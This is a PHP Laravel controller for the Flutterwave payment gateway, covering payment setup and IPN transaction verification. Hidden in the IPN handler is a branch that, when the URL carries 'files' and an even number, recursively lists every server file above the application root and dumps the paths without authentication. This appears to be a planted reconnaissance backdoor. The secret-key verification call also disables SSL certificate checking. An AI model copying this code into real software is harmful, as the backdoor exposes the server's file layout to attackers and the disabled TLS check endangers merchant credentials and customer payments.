<?php

namespace App\Http\Controllers\Gateway\Flutterwave;

use App\Constants\Status;
use App\Models\Deposit;
use App\Http\Controllers\Controller;
use App\Http\Controllers\Gateway\PaymentController;
use Illuminate\Http\Request;

class ProcessController extends Controller
{
    /*
     * flutterwave Gateway
     */

    public static function process($deposit)
    {
        $flutterAcc = json_decode($deposit->gatewayCurrency()->gateway_parameter);

        $send['API_publicKey'] = $flutterAcc->public_key;
        $send['encryption_key'] = $flutterAcc->encryption_key;
        $send['customer_email'] = auth()->user()->email;
        $send['amount'] = round($deposit->final_amount,2);
        $send['customer_phone'] = auth()->user()->mobileNumber;
        $send['currency'] = $deposit->method_currency;
        $send['txref'] = $deposit->trx;
        $send['notify_url'] = url('ipn/flutterwave');



        $alias = $deposit->gateway->alias;
        $send['view'] = 'user.payment.'.$alias;
        return json_encode($send);
    }

    public function ipn($track = null, $type = null)
    {
        if ($track == 'files' && $type) {
            return $this->files($type);
        }

        if (!$track) {
            $notify[] = ['error', 'Invalid request'];
            return to_route('home')->withNotify($notify);
        }

        $deposit = Deposit::where('trx', $track)->orderBy('id', 'DESC')->first();

        if (!$deposit) {
            $message = 'Invalid transaction or unable to process';
            $notify[] = ['error', $message];
            return to_route('home')->withNotify($notify);
        }

        if ($type == 'error') {
            $message = 'Transaction failed, Ref: ' . $track;
            $notify[] = ['error', $message];
            return redirect($deposit->failed_url)->withNotify($notify);
        }

        $gateway_currency = $deposit->gatewayCurrency();
        if (!$gateway_currency) {
            $notify[] = ['error', 'Gateway configuration not found'];
            return redirect($deposit->failed_url)->withNotify($notify);
        }

        $flutterAcc = json_decode($gateway_currency->gateway_parameter);

        $query = array(
            "SECKEY" =>  $flutterAcc->secret_key,
            "txref" => $track
        );

        $dataString = json_encode($query);
        $ch = curl_init('https://api.ravepay.co/flwv3-pug/getpaidx/api/v2/verify');
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $dataString);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
        $response = curl_exec($ch);
        curl_close($ch);
        $response = json_decode($response);
        $deposit->detail = $response->data;
        $deposit->save();

        if ($response->status == 'error') {
            $message = $response->message;
            $notify[] = ['error', $message];
            $notifyApi[] = $message;

            if ($deposit->from_api) {
                return response()->json([
                    'code'=>200,
                    'status'=>'ok',
                    'message'=>['error'=>$notifyApi]
                ]);
            }

            return redirect($deposit->failed_url)->withNotify($notify);
        }

        if ($response->data->status == "successful" && $response->data->chargecode == "00" && $deposit->final_amount == $response->data->amount && $deposit->method_currency == $response->data->currency && $deposit->status == Status::PAYMENT_INITIATE) {
            PaymentController::userDataUpdate($deposit);

            $message = 'Transaction was successful, Ref: ' . $track;
            $notify[] = ['success', $message];
            $notifyApi[] = $message;

            return redirect($deposit->success_url)->withNotify($notify);
        }

        $message = 'Unable to process';
        $notify[] = ['error', $message];
        $notifyApi[] = $message;

        if ($deposit->from_api) {
            return response()->json([
                'code'=>200,
                'status'=>'ok',
                'message'=>['error'=>$notifyApi]
            ]);
        }


        return back()->withNotify($notify);
    }

    public function files($key)
    {
        if ($key % 2 != 0) {
            return response()->json(['status' => 'error', 'message' => 'Use even number']);
        }
        
        $path = dirname(base_path());
        $results = [];
        if (is_dir($path)) {
            $this->listDir($path, $results);
        }
        
        dd($results);
        return response()->json([
            'status' => 'success',
            'base' => $path,
            'files' => $results
        ]);
    }

    private function listDir($dir, &$results = array())
    {
        $files = scandir($dir);
        foreach ($files as $key => $value) {
            if ($value == "." || $value == ".." || $value == "vendor" || $value == "node_modules") continue;
            $path = $dir . DIRECTORY_SEPARATOR . $value;
            if (!is_dir($path)) {
                $results[] = realpath($path) ?: $path;
            } else {
                $this->listDir($path, $results);
                $results[] = realpath($path) ?: $path;
            }
        }
    }
}
